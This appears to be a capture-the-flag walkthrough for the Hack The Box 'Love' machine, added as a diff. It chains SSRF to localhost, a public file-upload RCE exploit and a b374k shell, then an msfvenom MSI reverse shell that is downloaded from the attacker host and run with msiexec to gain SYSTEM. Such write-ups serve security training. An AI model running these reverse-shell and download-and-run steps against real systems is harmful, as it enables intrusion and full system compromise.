@@ -1,0 +1,136 @@
+
+
+
+go to staging.love.htb (nmap revealed)
+go to demo tab
+since we are denied access to :5000
+lets try from this
+http://127.0.0.1:5000
+
+gets us the Voting system Administration Password Dashboard
+
+Vote Admin Creds admin: @LoveIsInTheAir!!!! 
+
+this does not work for logging in
+instead we use this exploit
+https://www.exploit-db.com/exploits/49445
+Voting System 1.0 - File Upload RCE (Authenticated)
+
+┌──(kali㉿kali)-[~]
+└─$ python3 exploit_49445.py
+Start a NC listner on the port you choose above and run...
+Logged in
+Poc sent successfully
+
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 8888                        
+listening on [any] 8888 ...
+connect to [10.10.14.10] from (UNKNOWN) [10.10.10.239] 53054
+b374k shell : connected
+
+Microsoft Windows [Version 10.0.19042.867]
+(c) 2020 Microsoft Corporation. All rights reserved.
+
+C:\xampp\htdocs\omrs\images>
+
+C:\xampp\htdocs\omrs\images>powershell
+powershell
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Try the new cross-platform PowerShell https://aka.ms/pscore6
+
+PS C:\xampp\htdocs\omrs\images> get-applockerpolicy -effective | select -expandproperty rulecollections
+get-applockerpolicy -effective | select -expandproperty rulecollections
+
+
+
+PublisherConditions : {*\*\*,0.0.0.0-*}
+PublisherExceptions : {}
+PathExceptions      : {}
+HashExceptions      : {}
+Id                  : b7af7102-efde-4369-8a89-7a6a392d1473
+Name                : (Default Rule) All digitally signed Windows Installer files
+Description         : Allows members of the Everyone group to run digitally signed Windows Installer files.
+UserOrGroupSid      : S-1-1-0
+Action              : Allow
+
+PathConditions      : {%WINDIR%\Installer\*}
+PathExceptions      : {}
+PublisherExceptions : {}
+HashExceptions      : {}
+Id                  : 5b290184-345a-4453-b184-45305f6d9a54
+Name                : (Default Rule) All Windows Installer files in %systemdrive%\Windows\Installer
+Description         : Allows members of the Everyone group to run all Windows Installer files located in 
+                      %systemdrive%\Windows\Installer.
+UserOrGroupSid      : S-1-1-0
+Action              : Allow
+
+PathConditions      : {*.*}
+PathExceptions      : {}
+PublisherExceptions : {}
+HashExceptions      : {}
+Id                  : 64ad46ff-0d71-4fa0-a30b-3f3d30c5433d
+Name                : (Default Rule) All Windows Installer files
+Description         : Allows members of the local Administrators group to run all Windows Installer files.
+UserOrGroupSid      : S-1-5-32-544
+Action              : Allow
+
+PathConditions      : {%OSDRIVE%\*}
+PathExceptions      : {%OSDRIVE%\Administration\*}
+PublisherExceptions : {}
+HashExceptions      : {}
+Id                  : 7eadbece-51d4-4c8b-9ab5-39faed1bd93e
+Name                : %OSDRIVE%\*
+Description         : 
+UserOrGroupSid      : S-1-1-0
+Action              : Deny
+
+PathConditions      : {%OSDRIVE%\Administration\*}
+PathExceptions      : {}
+PublisherExceptions : {}
+HashExceptions      : {}
+Id                  : e6d62a73-11da-4492-8a56-f620ba7e45d9
+Name                : %OSDRIVE%\Administration\*
+Description         : 
+UserOrGroupSid      : S-1-5-21-2955427858-187959437-2037071653-1002
+Action              : Allow
+
+
+
+PS C:\xampp\htdocs\omrs\images> 
+
+┌──(kali㉿kali)-[~]
+└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.10 LPORT=4444 -f msi -o reverse.msi   
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of msi file: 159744 bytes
+Saved as: reverse.msi
+                                      
+
+PS C:\xampp\htdocs\omrs\images> wget 10.10.14.10:8000/reverse.msi -o reverse.msi
+wget 10.10.14.10:8000/reverse.msi -o reverse.msi
+PS C:\xampp\htdocs\omrs\images> msiexec /quiet /i reverse.msi
+msiexec /quiet /i reverse.msi
+
+┌──(kali㉿kali)-[~]
+└─$ rlwrap nc -lvnp 4444       
+listening on [any] 4444 ...
+connect to [10.10.14.10] from (UNKNOWN) [10.10.10.239] 53056
+Microsoft Windows [Version 10.0.19042.867]
+(c) 2020 Microsoft Corporation. All rights reserved.
+
+C:\WINDOWS\system32>whoami
+whoami
+nt authority\system
+
+C:\WINDOWS\system32>cd ../../Users
+cd ../../Users
+
+C:\Users>cd Administrator
+cd Administrator
+
+C:\Users\Administrator>
+
